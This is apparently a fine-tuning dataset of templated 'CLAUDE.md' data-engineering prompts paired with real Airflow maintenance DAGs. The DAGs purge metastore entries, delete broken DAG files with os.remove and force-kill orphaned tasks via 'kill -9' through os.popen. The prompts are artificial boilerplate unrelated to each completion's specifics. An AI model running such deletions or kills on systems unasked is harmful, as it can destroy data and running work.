session.query(DagModel).all()\n    entries_to_delete = []\n    for dag in dags:\n        # Check if it is a zip-file\n        if dag.fileloc is not None and '.zip/' in dag.fileloc:\n            index = dag.fileloc.rfind('.zip/') + len('.zip')\n            fileloc = dag.fileloc[0:index]\n        else:\n            fileloc = dag.fileloc\n\n        if fileloc is None:\n            logging.info(\n                \"After checking DAG '\" + str(dag) +\n                \"', the fileloc was set to None so assuming the Python \" +\n                \"definition file DOES NOT exist\"\n            )\n            entries_to_delete.append(dag)\n        elif not os.path.exists(fileloc):\n            logging.info(\n                \"After checking DAG '\" + str(dag) +\n                \"', the Python definition file DOES NOT exist: \" + fileloc\n            )\n            entries_to_delete.append(dag)\n        else:\n            logging.info(\n                \"After checking DAG '\" + str(dag) +\n                \"', the Python definition file does exist: \" + fileloc\n            )\n\n    logging.info(\"Process will be Deleting the DAG(s) from the DB:\")\n    for entry in entries_to_delete:\n        logging.info(\"\\tEntry: \" + str(entry))\n    logging.info(\n        \"Process will be Deleting \" + str(len(entries_to_delete)) + \" DAG(s)\"\n    )\n\n    if ENABLE_DELETE:\n        logging.info(\"Performing Delete...\")\n        for entry in entries_to_delete:\n            session.delete(entry)\n        session.commit()\n        logging.info(\"Finished Performing Delete\")\n    else:\n        logging.warn(\"You're opted to skip deleting the DAG entries!!!\")\n\n    logging.info(\"Finished Running Clear Process\")\n\n\nclear_missing_dags = PythonOperator(\n    task_id='clear_missing_dags',\n    python_callable=clear_missing_dags_fn,\n    provide_context=True,\n    dag=dag)\n", "metadata": {"source": "github.com/teamclairvoyant/airflow-maintenance-dags", "file_path": "clear-missing-dags/airflow-clear-missing-dags.py", "language": "python", "complexity": "medium", "star_count": 1731, "quality_score": 0.8099999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nA maintenance workflow that you can deploy into Airflow to periodically clean\nout the DagRun, TaskInstance, Log, XCom, Job DB and SlaMiss entries to avoid\nhaving too much data in your Airflow MetaStore.\n\nairflow trigger_dag --conf '[curly-braces]\"maxDBEntryAgeInDays\":30[curly-braces]' airflow-db-cleanup\n\n--conf options:\n    maxDBEntryAgeInDays:<INT> - Optional\n\n\"\"\"\nimport airflow\nfrom airflow import settings\nfrom airflow.configuration import conf\nfrom airflow.models import DAG, DagTag, DagModel, DagRun, Log, XCom, SlaMiss, TaskInstance, Variable\ntry:\n    from airflow.jobs import BaseJob\nexcept Exception as e:\n    from airflow.jobs.base_job import BaseJob\nfrom airflow.operators.python_operator import PythonOperator\nfrom datetime import datetime, timedelta\nimport dateutil.parser\nimport logging\nimport os\nfrom sqlalchemy import func, and_\nfrom sqlalchemy.exc import ProgrammingError\nfrom sqlalchemy.orm import load_only\n\ntry:\n    # airflow.utils.timezone is available from v1.10 onwards\n    from airflow.utils import timezone\n    now = timezone.utcnow\nexcept ImportError:\n    now = datetime.utcnow\n\n# airflow-db-cleanup\nDAG_ID = os.path.basename(__file__).replace(\".pyc\", \"\").replace(\".py\", \"\")\nSTART_DATE = airflow.utils.dates.days_ago(1)\n# How often to Run. @daily - Once a day at Midnight (UTC)\nSCHEDULE_INTERVAL = \"@daily\"\n# Who is listed as the owner of this DAG in the Airflow Web Server\nDAG_OWNER_NAME = \"operations\"\n# List of email address to send email alerts to if this job fails\nALERT_EMAIL_ADDRESSES = []\n# Length to retain the log files if not already provided in the conf. If this\n# is set to 30, the job will remove those files that arE 30 days old or older.\n\nDEFAULT_MAX_DB_ENTRY_AGE_IN_DAYS = int(\n    Variable.get(\"airflow_db_cleanup__max_db_entry_age_in_days\", 30)\n)\n# Prints the database entries which will be getting deleted; set to False to avoid printing large lists and slowdown process\nPRINT_DELETES = True\n# Whether the job should delete the db entries or not. Included if you want to\n# temporarily avoid deleting the db entries.\nENABLE_DELETE = True\n\n# get dag model last schedule run\ntry:\n    dag_model_last_scheduler_run = DagModel.last_scheduler_run\nexcept AttributeError:\n    dag_model_last_scheduler_run = DagModel.last_parsed_time\n\n# List of all the objects that will be deleted. Comment out the DB objects you\n# want to skip.\nDATABASE_OBJECTS = [\n    {\n        \"airflow_db_model\": BaseJob,\n        \"age_check_column\": BaseJob.latest_heartbeat,\n        \"keep_last\": False,\n        \"keep_last_filters\": None,\n        \"keep_last_group_by\": None\n    },\n    {\n        \"airflow_db_model\": DagRun,\n        \"age_check_column\": DagRun.execution_date,\n        \"keep_last\": True,\n        \"keep_last_filters\": [DagRun.external_trigger.is_(False)],\n        \"keep_last_group_by\": DagRun.dag_id\n    },\n    {\n        \"airflow_db_model\": TaskInstance,\n        \"age_check_column\": TaskInstance.execution_date,\n        \"keep_last\": False,\n        \"keep_last_filters\": None,\n        \"keep_last_group_by\": None\n    },\n    {\n        \"airflow_db_model\": Log,\n        \"age_check_column\": Log.dttm,\n        \"keep_last\": False,\n        \"keep_last_filters\": None,\n        \"keep_last_group_by\": None\n    },\n    {\n        \"airflow_db_model\": XCom,\n        \"age_check_column\": XCom.execution_date,\n        \"keep_last\": False,\n        \"keep_last_filters\": None,\n        \"keep_last_group_by\": None\n    },\n    {\n        \"airflow_db_model\": SlaMiss,\n        \"age_check_column\": SlaMiss.execution_date,\n        \"keep_last\": False,\n        \"keep_last_filters\": None,\n        \"keep_last_group_by\": None\n    },\n    {\n        \"airflow_db_model\": DagModel,\n        \"age_check_column\": dag_model_last_scheduler_run,\n        \"keep_last\": False,\n        \"keep_last_filters\": None,\n        \"keep_last_group_by\": None\n    }]\n\n# Check for TaskReschedule model\ntry:\n    from airflow.models import TaskReschedule\n    DATABASE_OBJECTS.append({\n        \"airflow_db_model\": TaskReschedule,\n        \"age_check_column\": TaskReschedule.execution_date,\n        \"keep_last\": False,\n        \"keep_last_filters\": None,\n        \"keep_last_group_by\": None\n    })\n\nexcept Exception as e:\n    logging.error(e)\n\n# Check for TaskFail model\ntry:\n    from airflow.models import TaskFail\n    DATABASE_OBJECTS.append({\n        \"airflow_db_model\": TaskFail,\n        \"age_check_column\": TaskFail.execution_date,\n        \"keep_last\": False,\n        \"keep_last_filters\": None,\n        \"keep_last_group_by\": None\n    })\n\nexcept Exception as e:\n    logging.error(e)\n\n# Check for RenderedTaskInstanceFields model\ntry:\n    from airflow.models import RenderedTaskInstanceFields\n    DATABASE_OBJECTS.append({\n        \"airflow_db_model\": RenderedTaskInstanceFields,\n        \"age_check_column\": RenderedTaskInstanceFields.execution_date,\n        \"keep_last\": False,\n        \"keep_last_filters\": None,\n        \"keep_last_group_by\": None\n    })\n\nexcept Exception as e:\n    logging.error(e)\n\n# Check for ImportError model\ntry:\n    from airflow.models import ImportError\n    DATABASE_OBJECTS.append({\n        \"airflow_db_model\": ImportError,\n        \"age_check_column\": ImportError.timestamp,\n        \"keep_last\": False,\n        \"keep_last_filters\": None,\n        \"keep_last_group_by\": None\n    })\n\nexcept Exception as e:\n    logging.error(e)\n\n# Check for celery executor\nairflow_executor = str(conf.get(\"core\", \"executor\"))\nlogging.info(\"Airflow Executor: \" + str(airflow_executor))\nif(airflow_executor == \"CeleryExecutor\"):\n    logging.info(\"Including Celery Modules\")\n    try:\n        from celery.backends.database.models import Task, TaskSet\n        DATABASE_OBJECTS.extend((\n            {\n                \"airflow_db_model\": Task,\n                \"age_check_column\": Task.date_done,\n                \"keep_last\": False,\n                \"keep_last_filters\": None,\n                \"keep_last_group_by\": None\n            },\n            {\n                \"airflow_db_model\": TaskSet,\n                \"age_check_column\": TaskSet.date_done,\n                \"keep_last\": False,\n                \"keep_last_filters\": None,\n                \"keep_last_group_by\": None\n            }))\n\n    except Exception as e:\n        logging.error(e)\n\nsession = settings.Session()\n\ndefault_args = {\n    'owner': DAG_OWNER_NAME,\n    'depends_on_past': False,\n    'email': ALERT_EMAIL_ADDRESSES,\n    'email_on_failure': True,\n    'email_on_retry': False,\n    'start_date': START_DATE,\n    'retries': 1,\n    'retry_delay': timedelta(minutes=1)\n}\n\ndag = DAG(\n    DAG_ID,\n    default_args=default_args,\n    schedule_interval=SCHEDULE_INTERVAL,\n    start_date=START_DATE,\n    tags=['teamclairvoyant', 'airflow-maintenance-dags']\n)\nif hasattr(dag, 'doc_md'):\n    dag.doc_md = __doc__\nif hasattr(dag, 'catchup'):\n    dag.catchup = False\n\n\ndef print_configuration_function(**context):\n    logging.info(\"Loading Configurations...\")\n    dag_run_conf = context.get(\"dag_run\").conf\n    logging.info(\"dag_run.conf: \" + str(dag_run_conf))\n    max_db_entry_age_in_days = None\n    if dag_run_conf:\n        max_db_entry_age_in_days = dag_run_conf.get(\n            \"maxDBEntryAgeInDays\", None\n        )\n    logging.info(\"maxDBEntryAgeInDays from dag_run.conf: \" + str(dag_run_conf))\n    if (max_db_entry_age_in_days is None or max_db_entry_age_in_days < 1):\n        logging.info(\n            \"maxDBEntryAgeInDays conf variable isn't included or Variable \" +\n            \"value is less than 1. Using Default '\" +\n            str(DEFAULT_MAX_DB_ENTRY_AGE_IN_DAYS) + \"'\"\n        )\n        max_db_entry_age_in_days = DEFAULT_MAX_DB_ENTRY_AGE_IN_DAYS\n    max_date = now() + timedelta(-max_db_entry_age_in_days)\n    logging.info(\"Finished Loading Configurations\")\n    logging.info(\"\")\n\n    logging.info(\"Configurations:\")\n    logging.info(\"max_db_entry_age_in_days: \" + str(max_db_entry_age_in_days))\n    logging.info(\"max_date:                 \" + str(max_date))\n    logging.info(\"enable_delete:            \" + str(ENABLE_DELETE))\n    logging.info(\"session:                  \" + str(session))\n    logging.info(\"\")\n\n    logging.info(\"Setting max_execution_date to XCom for Downstream Processes\")\n    context[\"ti\"].xcom_push(key=\"max_date\", value=max_date.isoformat())\n\n\nprint_configuration = PythonOperator(\n    task_id='print_configuration',\n    python_callable=print_configuration_function,\n    provide_context=True,\n    dag=dag)\n\n\ndef cleanup_function(**context):\n\n    logging.info(\"Retrieving max_execution_date from XCom\")\n    max_date = context[\"ti\"].xcom_pull(\n        task_ids=print_configuration.task_id, key=\"max_date\"\n    )\n    max_date = dateutil.parser.parse(max_date)  # stored as iso8601 str in xcom\n\n    airflow_db_model = context[\"params\"].get(\"airflow_db_model\")\n    state = context[\"params\"].get(\"state\")\n    age_check_column = context[\"params\"].get(\"age_check_column\")\n    keep_last = context[\"params\"].get(\"keep_last\")\n    keep_last_filters = context[\"params\"].get(\"keep_last_filters\")\n    keep_last_group_by = context[\"params\"].get(\"keep_last_group_by\")\n\n    logging.info(\"Configurations:\")\n    logging.info(\"max_date:                 \" + str(max_date))\n    logging.info(\"enable_delete:            \" + str(ENABLE_DELETE))\n    logging.info(\"session:                  \" + str(session))\n    logging.info(\"airflow_db_model:         \" + str(airflow_db_model))\n    logging.info(\"state:                    \" + str(state))\n    logging.info(\"age_check_column:         \" + str(age_check_column))\n    logging.info(\"keep_last:                \" + str(keep_last))\n    logging.info(\"keep_last_filters:        \" + str(keep_last_filters))\n    logging.info(\"keep_last_group_by:       \" + str(keep_last_group_by))\n\n    logging.info(\"\")\n\n    logging.info(\"Running Cleanup Process...\")\n\n    try:\n        query = session.query(airflow_db_model).options(\n            load_only(age_check_column)\n        )\n\n        logging.info(\"INITIAL QUERY : \" + str(query))\n\n        if keep_last:\n\n            subquery = session.query(func.max(DagRun.execution_date))\n            # workaround for MySQL \"table specified twice\" issue\n            # https://github.com/teamclairvoyant/airflow-maintenance-dags/issues/41\n            if keep_last_filters is not None:\n                for entry in keep_last_filters:\n                    subquery = subquery.filter(entry)\n\n                logging.info(\"SUB QUERY [keep_last_filters]: \" + str(subquery))\n\n            if keep_last_group_by is not None:\n                subquery = subquery.group_by(keep_last_group_by)\n                logging.info(\n                    \"SUB QUERY [keep_last_group_by]: \" + str(subquery))\n\n            subquery = subquery.from_self()\n\n            query = query.filter(\n                and_(age_check_column.notin_(subquery)),\n                and_(age_check_column <= max_date)\n            )\n\n        else:\n            query = query.filter(age_check_column <= max_date,)\n\n        if PRINT_DELETES:\n            entries_to_delete = query.all()\n\n            logging.info(\"Query: \" + str(query))\n            logging.info(\n                \"Process will be Deleting the following \" +\n                str(airflow_db_model.__name__) + \"(s):\"\n            )\n            for entry in entries_to_delete:\n                logging.info(\n                    \"\\tEntry: \" + str(entry) + \", Date: \" +\n                    str(entry.__dict__[str(age_check_column).split(\".\")[1]])\n                )\n\n            logging.info(\n                \"Process will be Deleting \" + str(len(entries_to_delete)) + \" \" +\n                str(airflow_db_model.__name__) + \"(s)\"\n            )\n        else:\n            logging.warn(\n                \"You've opted to skip printing the db entries to be deleted. Set PRINT_DELETES to True to show entries!!!\")\n\n        if ENABLE_DELETE:\n            logging.info('Performing Delete...')\n            if airflow_db_model.__name__ == 'DagModel':\n                logging.info('Deleting tags...')\n                ids_query = query.from_self().with_entities(DagModel.dag_id)\n                tags_query = session.query(DagTag).filter(DagTag.dag_id.in_(ids_query))\n                logging.info('Tags delete Query: ' + str(tags_query))\n                tags_query.delete(synchronize_session=False)\n            # using bulk delete\n            query.delete(synchronize_session=False)\n            session.commit()\n            logging.info('Finished Performing Delete')\n        else:\n            logging.warn(\n                \"You've opted to skip deleting the db entries. Set ENABLE_DELETE to True to delete entries!!!\")\n\n        logging.info(\"Finished Running Cleanup Process\")\n\n    except ProgrammingError as e:\n        logging.error(e)\n        logging.error(str(airflow_db_model) +\n                      \" is not present in the metadata. Skipping...\")\n\n\nfor db_object in DATABASE_OBJECTS:\n\n    cleanup_op = PythonOperator(\n        task_id='cleanup_' + str(db_object[\"airflow_db_model\"].__name__),\n        python_callable=cleanup_function,\n        params=db_object,\n        provide_context=True,\n        dag=dag\n    )\n\n    print_configuration.set_downstream(cleanup_op)\n", "metadata": {"source": "github.com/teamclairvoyant/airflow-maintenance-dags", "file_path": "db-cleanup/airflow-db-cleanup.py", "language": "python", "complexity": "complex", "star_count": 1731, "quality_score": 0.87, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nA maintenance workflow that you can deploy into Airflow to periodically delete broken DAG file(s).\n\nairflow trigger_dag airflow-delete-broken-dags\n\n\"\"\"\nfrom airflow.models import DAG, ImportError\nfrom airflow.operators.python_operator import PythonOperator\nfrom airflow import settings\nfrom datetime import timedelta\nimport os\nimport os.path\nimport socket\nimport logging\nimport airflow\n\n\n# airflow-delete-broken-dags\nDAG_ID = os.path.basename(__file__).replace(\".pyc\", \"\").replace(\".py\", \"\")\nSTART_DATE = airflow.utils.dates.days_ago(1)\n# How often to Run. @daily - Once a day at Midnight\nSCHEDULE_INTERVAL = \"@daily\"\n# Who is listed as the owner of this DAG in the Airflow Web Server\nDAG_OWNER_NAME = \"operations\"\n# List of email address to send email alerts to if this job fails\nALERT_EMAIL_ADDRESSES = []\n# Whether the job should delete the logs or not. Included if you want to\n# temporarily avoid deleting the logs\nENABLE_DELETE = True\n\ndefault_args = {\n    'owner': DAG_OWNER_NAME,\n    'email': ALERT_EMAIL_ADDRESSES,\n    'email_on_failure': True,\n    'email_on_retry': False,\n    'start_date': START_DATE,\n    'retries': 1,\n    'retry_delay': timedelta(minutes=1)\n}\n\ndag = DAG(\n    DAG_ID,\n    default_args=default_args,\n    schedule_interval=SCHEDULE_INTERVAL,\n    start_date=START_DATE,\n    tags=['teamclairvoyant', 'airflow-maintenance-dags']\n)\nif hasattr(dag, 'doc_md'):\n    dag.doc_md = __doc__\nif hasattr(dag, 'catchup'):\n    dag.catchup = False\n\n\ndef delete_broken_dag_files(**context):\n\n    logging.info(\"Starting to run Clear Process\")\n\n    try:\n        host_name = socket.gethostname()\n        host_ip = socket.gethostbyname(host_name)\n        logging.info(\"Running on Machine with Host Name: \" + host_name)\n        logging.info(\"Running on Machine with IP: \" + host_ip)\n    except Exception as e:\n        print(\"Unable to get Host Name and IP: \" + str(e))\n\n    session = settings.Session()\n\n    logging.info(\"Configurations:\")\n    logging.info(\"enable_delete:            \" + str(ENABLE_DELETE))\n    logging.info(\"session:                  \" + str(session))\n    logging.info(\"\")\n\n    errors = session.query(ImportError).all()\n\n    logging.info(\n        \"Process will be removing broken DAG file(s) from the file system:\"\n    )\n    for error in errors:\n        logging.info(\"\\tFile: \" + str(error.filename))\n    logging.info(\n        \"Process will be Deleting \" + str(len(errors)) + \" DAG file(s)\"\n    )\n\n    if ENABLE_DELETE:\n        logging.info(\"Performing Delete...\")\n        for error in errors:\n            if os.path.exists(error.filename):\n                os.remove(error.filename)\n            session.delete(error)\n        logging.info(\"Finished Performing Delete\")\n    else:\n        logging.warn(\"You're opted to skip Deleting the DAG file(s)!!!\")\n\n    logging.info(\"Finished\")\n\n\ndelete_broken_dag_files = PythonOperator(\n    task_id='delete_broken_dag_files',\n    python_callable=delete_broken_dag_files,\n    provide_context=True,\n    dag=dag)\n", "metadata": {"source": "github.com/teamclairvoyant/airflow-maintenance-dags", "file_path": "delete-broken-dags/airflow-delete-broken-dags.py", "language": "python", "complexity": "medium", "star_count": 1731, "quality_score": 0.8099999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nA maintenance workflow that you can deploy into Airflow to periodically kill\noff tasks that are running in the background that don't correspond to a running\ntask in the DB.\n\nThis is useful because when you kill off a DAG Run or Task through the Airflow\nWeb Server, the task still runs in the background on one of the executors until\nthe task is complete.\n\nairflow trigger_dag airflow-kill-halted-tasks\n\n\"\"\"\nfrom airflow.models import DAG, DagModel, DagRun, TaskInstance\nfrom airflow import settings\nfrom airflow.operators.python_operator \\\n    import PythonOperator, ShortCircuitOperator\nfrom airflow.operators.email_operator import EmailOperator\nfrom sqlalchemy import and_\nfrom datetime import datetime, timedelta\nimport os\nimport re\nimport logging\nimport pytz\nimport airflow\n\n\n# airflow-kill-halted-tasks\nDAG_ID = os.path.basename(__file__).replace(\".pyc\", \"\").replace(\".py\", \"\")\nSTART_DATE = airflow.utils.dates.days_ago(1)\n# How often to Run. @daily - Once a day at Midnight. @hourly - Once an Hour.\nSCHEDULE_INTERVAL = \"@hourly\"\n# Who is listed as the owner of this DAG in the Airflow Web Server\nDAG_OWNER_NAME = \"operations\"\n# List of email address to send email alerts to if this job fails\nALERT_EMAIL_ADDRESSES = []\n# Whether to send out an email whenever a process was killed during a DAG Run\n# or not\nSEND_PROCESS_KILLED_EMAIL = True\n# Subject of the email that is sent out when a task is killed by the DAG\nPROCESS_KILLED_EMAIL_SUBJECT = DAG_ID + \" - Tasks were Killed\"\n# List of email address to send emails to when a task is killed by the DAG\nPROCESS_KILLED_EMAIL_ADDRESSES = []\n# Whether the job should delete the db entries or not. Included if you want to\n# temporarily avoid deleting the db entries.\nENABLE_KILL = True\n# Whether to print out certain statements meant for debugging\nDEBUG = False\n\ndefault_args = {\n    'owner': DAG_OWNER_NAME,\n    'email': ALERT_EMAIL_ADDRESSES,\n    'email_on_failure': True,\n    'email_on_retry': False,\n    'start_date': START_DATE,\n    'retries': 1,\n    'retry_delay': timedelta(minutes=1)\n}\n\ndag = DAG(\n    DAG_ID,\n    default_args=default_args,\n    schedule_interval=SCHEDULE_INTERVAL,\n    start_date=START_DATE,\n    tags=['teamclairvoyant', 'airflow-maintenance-dags']\n)\nif hasattr(dag, 'doc_md'):\n    dag.doc_md = __doc__\nif hasattr(dag, 'catchup'):\n    dag.catchup = False\n\n\nuid_regex = \"(\\w+)\"\npid_regex = \"(\\w+)\"\nppid_regex = \"(\\w+)\"\nprocessor_scheduling_regex = \"(\\w+)\"\nstart_time_regex = \"([\\w:.]+)\"\ntty_regex = \"([\\w?/]+)\"\ncpu_time_regex = \"([\\w:.]+)\"\ncommand_regex = \"(.+)\"\n\n# When Search Command is:  ps -o pid -o cmd -u `whoami` | grep 'airflow run'\nfull_regex = '\\s*' + pid_regex + '\\s+' + command_regex\n\nairflow_run_regex = '.*run\\s([\\w._-]*)\\s([\\w._-]*)\\s([\\w:.-]*).*'\n\n\ndef parse_process_linux_string(line):\n    if DEBUG:\n        logging.info(\"DEBUG: Processing Line: \" + str(line))\n    full_regex_match = re.search(full_regex, line)\n    if DEBUG:\n        for index in range(0, (len(full_regex_match.groups()) + 1)):\n            group = full_regex_match.group(index)\n            logging.info(\n                \"DEBUG: index: \" + str(index) + \", group: \" + str(group)\n            )\n    pid = full_regex_match.group(1)\n    command = full_regex_match.group(2).strip()\n    process = {\"pid\": pid, \"command\": command}\n\n    if DEBUG:\n        logging.info(\"DEBUG: Processing Command: \" + str(command))\n    airflow_run_regex_match = re.search(airflow_run_regex, command)\n    if DEBUG:\n        for index in range(0, (len(airflow_run_regex_match.groups()) + 1)):\n            group = airflow_run_regex_match.group(index)\n            logging.info(\n                \"DEBUG: index: \" + str(index) + \", group: \" + str(group)\n            )\n    process[\"airflow_dag_id\"] = airflow_run_regex_match.group(1)\n    process[\"airflow_task_id\"] = airflow_run_regex_match.group(2)\n    process[\"airflow_execution_date\"] = airflow_run_regex_match.group(3)\n    return process\n\n\ndef kill_halted_tasks_function(**context):\n    logging.info(\"Getting Configurations...\")\n    airflow_version = airflow.__version__\n    session = settings.Session()\n\n    logging.info(\"Finished Getting Configurations\\n\")\n\n    logging.info(\"Configurations:\")\n    logging.info(\n        \"send_process_killed_email:      \" + str(SEND_PROCESS_KILLED_EMAIL)\n    )\n    logging.info(\n        \"process_killed_email_subject:   \" + str(PROCESS_KILLED_EMAIL_SUBJECT)\n    )\n    logging.info(\n        \"process_killed_email_addresses: \" +\n        str(PROCESS_KILLED_EMAIL_ADDRESSES)\n    )\n    logging.info(\"enable_kill:                    \" + str(ENABLE_KILL))\n    logging.info(\"debug:                          \" + str(DEBUG))\n    logging.info(\"session:                        \" + str(session))\n    logging.info(\"airflow_version:                \" + str(airflow_version))\n    logging.info(\"\")\n\n    logging.info(\"Running Cleanup Process...\")\n    logging.info(\"\")\n\n    process_search_command = (\n        \"ps -o pid -o cmd -u `whoami` | grep 'airflow run'\"\n    )\n    logging.info(\"Running Search Process: \" + process_search_command)\n    search_output = os.popen(process_search_command).read()\n    logging.info(\"Search Process Output: \")\n    logging.info(search_output)\n\n    logging.info(\n        \"Filtering out: Empty Lines, Grep processes, and this DAGs Run.\"\n    )\n    search_output_filtered = [\n        line for line in search_output.split(\"\\n\") if line is not None\n        and line.strip() != \"\" and ' grep ' not in line\n        and DAG_ID not in line\n    ]\n    logging.info(\"Search Process Output (with Filter): \")\n    for line in search_output_filtered:\n        logging.info(line)\n    logging.info(\"\")\n\n    logging.info(\"Searching through running processes...\")\n    airflow_timezone_not_required_versions = ['1.7', '1.8', '1.9']\n    processes_to_kill = []\n    for line in search_output_filtered:\n        logging.info(\"\")\n        process = parse_process_linux_string(line=line)\n\n        logging.info(\"Checking: \" + str(process))\n        exec_date_str = (process[\"airflow_execution_date\"]).replace(\"T\", \" \")\n        if '.' not in exec_date_str:\n            # Add milliseconds if they are missing.\n            exec_date_str = exec_date_str + '.0'\n        execution_date_to_search_for = datetime.strptime(\n            exec_date_str, '%Y-%m-%d %H:%M:%S.%f'\n        )\n        # apache-airflow version >= 1.10 requires datetime field values with\n        # timezone\n        if airflow_version[:3] not in airflow_timezone_not_required_versions:\n            execution_date_to_search_for = pytz.utc.localize(\n                execution_date_to_search_for\n            )\n\n        logging.info(\n            \"Execution Date to Search For: \" +\n            str(execution_date_to_search_for)\n        )\n\n        # Checking to make sure the DAG is available and active\n        if DEBUG:\n            logging.info(\"DEBUG: Listing All DagModels: \")\n            for dag in session.query(DagModel).all():\n                logging.info(\n                    \"DEBUG: dag: \" + str(dag) + \", dag.is_active: \" +\n                    str(dag.is_active)\n                )\n            logging.info(\"\")\n        logging.info(\n            \"Getting dag where DagModel.dag_id == '\" +\n            str(process[\"airflow_dag_id\"]) + \"'\"\n        )\n        dag = session.query(DagModel).filter(\n            DagModel.dag_id == process[\"airflow_dag_id\"]\n        ).first()\n        logging.info(\"dag: \" + str(dag))\n        if dag is None:\n            kill_reason = \"DAG was not found in metastore.\"\n            process[\"kill_reason\"] = kill_reason\n            processes_to_kill.append(process)\n            logging.warn(kill_reason)\n            logging.warn(\"Marking process to be killed.\")\n            continue\n        logging.info(\"dag.is_active: \" + str(dag.is_active))\n        if not dag.is_active:  # is the dag active?\n            kill_reason = \"DAG was found to be Disabled.\"\n            process[\"kill_reason\"] = kill_reason\n            processes_to_kill.append(process)\n            logging.warn(kill_reason)\n            logging.warn(\"Marking process to be killed.\")\n            continue\n\n        # Checking to make sure the DagRun is available and in a running state\n        if DEBUG:\n            dag_run_relevant_states = [\"queued\", \"running\", \"up_for_retry\"]\n            logging.info(\n                \"DEBUG: Listing All Relevant DAG Runs (With State: \" +\n                str(dag_run_relevant_states) + \"): \"\n            )\n            for dag_run in session.query(DagRun).filter(\n                DagRun.state.in_(dag_run_relevant_states)\n            ).all():\n                logging.info(\n                    \"DEBUG: dag_run: \" + str(dag_run) + \", dag_run.state: \" +\n                    str(dag_run.state)\n                )\n            logging.info(\"\")\n        logging.info(\n            \"Getting dag_run where DagRun.dag_id == '\" +\n            str(process[\"airflow_dag_id\"]) +\n            \"' AND DagRun.execution_date == '\" +\n            str(execution_date_to_search_for) + \"'\"\n        )\n\n        dag_run = session.query(DagRun).filter(\n            and_(\n                DagRun.dag_id == process[\"airflow_dag_id\"],\n                DagRun.execution_date == execution_date_to_search_for,\n            )\n        ).first()\n\n        logging.info(\"dag_run: \" + str(dag_run))\n        if dag_run is None:\n            kill_reason = \"DAG RUN was not found in metastore.\"\n            process[\"kill_reason\"] = kill_reason\n            processes_to_kill.append(process)\n            logging.warn(kill_reason)\n            logging.warn(\"Marking process to be killed.\")\n            continue\n        logging.info(\"dag_run.state: \" + str(dag_run.state))\n        dag_run_states_required = [\"running\"]\n        # is the dag_run in a running state?\n        if dag_run.state not in dag_run_states_required:\n            kill_reason = (\n                \"DAG RUN was found to not be in the states '\" +\n                str(dag_run_states_required) +\n                \"', but rather was in the state '\" + str(dag_run.state) + \"'.\"\n            )\n            process[\"kill_reason\"] = kill_reason\n            processes_to_kill.append(process)\n            logging.warn(kill_reason)\n            logging.warn(\"Marking process to be killed.\")\n            continue\n\n        # Checking to ensure TaskInstance is available and in a running state\n        if DEBUG:\n            task_instance_relevant_states = [\n                \"queued\", \"running\", \"up_for_retry\"\n            ]\n            logging.info(\n                \"DEBUG: Listing All Relevant TaskInstances (With State: \" +\n                str(task_instance_relevant_states) + \"): \"\n            )\n            for task_instance in session.query(TaskInstance).filter(\n                TaskInstance.state.in_(task_instance_relevant_states)\n            ).all():\n                logging.info(\n                    \"DEBUG: task_instance: \" + str(task_instance) +\n                    \", task_instance.state: \" + str(task_instance.state)\n                )\n            logging.info(\"\")\n        logging.info(\n            \"Getting task_instance where TaskInstance.dag_id == '\" +\n            str(process[\"airflow_dag_id\"]) +\n            \"' AND TaskInstance.task_id == '\" +\n            str(process[\"airflow_task_id\"]) +\n            \"' AND TaskInstance.execution_date == '\" +\n            str(execution_date_to_search_for) + \"'\"\n        )\n\n        task_instance = session.query(TaskInstance).filter(\n            and_(\n                TaskInstance.dag_id == process[\"airflow_dag_id\"],\n                TaskInstance.task_id == process[\"airflow_task_id\"],\n                TaskInstance.execution_date == execution_date_to_search_for,\n            )\n        ).first()\n\n        logging.info(\"task_instance: \" + str(task_instance))\n        if task_instance is None:\n            kill_reason = (\n                \"Task Instance was not found in metastore. Marking process \"\n                \"to be killed.\"\n            )\n            process[\"kill_reason\"] = kill_reason\n            processes_to_kill.append(process)\n            logging.warn(kill_reason)\n            logging.warn(\"Marking process to be killed.\")\n            continue\n        logging.info(\"task_instance.state: \" + str(task_instance.state))\n        task_instance_states_required = [\"queued\", \"running\", \"up_for_retry\"]\n        # is task_instance queued, running or up for retry?\n        if task_instance.state not in task_instance_states_required:\n            kill_reason = (\n                \"The TaskInstance was found to not be in the states '\" +\n                str(task_instance_states_required) +\n                \"', but rather was in the state '\" +\n                str(task_instance.state) + \"'.\"\n            )\n            process[\"kill_reason\"] = kill_reason\n            processes_to_kill.append(process)\n            logging.warn(kill_reason)\n            logging.warn(\"Marking process to be killed.\")\n            continue\n\n    # Listing processes that will be killed\n    logging.info(\"\")\n    logging.info(\"Processes Marked to Kill: \")\n    if len(processes_to_kill) > 0:\n        for process in processes_to_kill:\n            logging.info(str(process))\n    else:\n        logging.info(\"No Processes Marked to Kill Found\")\n\n    # Killing the processes\n    logging.info(\"\")\n    if ENABLE_KILL:\n        logging.info(\"Performing Kill...\")\n        if len(processes_to_kill) > 0:\n            for process in processes_to_kill:\n                logging.info(\"Killing Process: \" + str(process))\n                kill_command = \"kill -9 \" + str(process[\"pid\"])\n                logging.info(\"Running Command: \" + str(kill_command))\n                output = os.popen(kill_command).read()\n                logging.info(\"kill output: \" + str(output))\n            context['ti'].xcom_push(\n                key='kill_halted_tasks.processes_to_kill',\n                value=processes_to_kill\n            )\n            logging.info(\"Finished Performing Kill\")\n        else:\n            logging.info(\"No Processes Marked to Kill Found\")\n    else:\n        logging.warn(\"You're opted to skip killing the processes!!!\")\n\n    logging.info(\"\")\n    logging.info(\"Finished Running Cleanup Process\")\n\n\nkill_halted_tasks_op = 